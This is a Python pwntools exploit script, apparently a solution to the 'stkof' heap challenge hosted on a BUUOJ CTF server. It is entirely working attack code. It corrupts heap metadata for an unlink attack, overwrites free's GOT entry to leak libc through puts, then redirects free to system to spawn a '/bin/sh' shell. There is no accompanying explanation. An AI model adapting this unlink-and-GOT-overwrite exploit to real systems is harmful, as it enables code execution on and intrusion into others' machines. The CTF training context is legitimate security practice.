import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./stkof')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./stkof')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29104)
			elf=ELF('./stkof')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a):
			io.sendlineafter('OK','1')
			sleep(0.1)
			io.sendline(str(a))

		def delete(a):
			io.sendlineafter('OK','3')
			sleep(0.1)
			io.sendline(str(a))

		def edit(a,b,c):
			io.sendlineafter('OK','2')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.sendline(str(b))
			sleep(0.1)
			io.send(c)

		
		chunk_2=0x000000000602150
		io.sendline(str(1))
		io.sendline(str(0x98))
		add(0x98)
		add(0x88)
		edit(2,0xa0,p64(0)+p64(0x91)+p64(chunk_2-0x18)+p64(chunk_2-0x10)+'1'*0x70+p64(0x90)+p64(0x90))
		delete(3)
		edit(2,0x28,p64(0)+p64(0)+p64(chunk_2-0x8)+p64(elf.got['free'])+p64(elf.got['puts']))
		edit(2,0x8,p64(elf.plt['puts']))
		delete(3)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		edit(2,0x8,p64(libc.sym['system']))
		add(0x28)
		edit(4,0x8,'/bin/sh\x00')
		delete(4)




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('>.<_keer_>.< # ')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue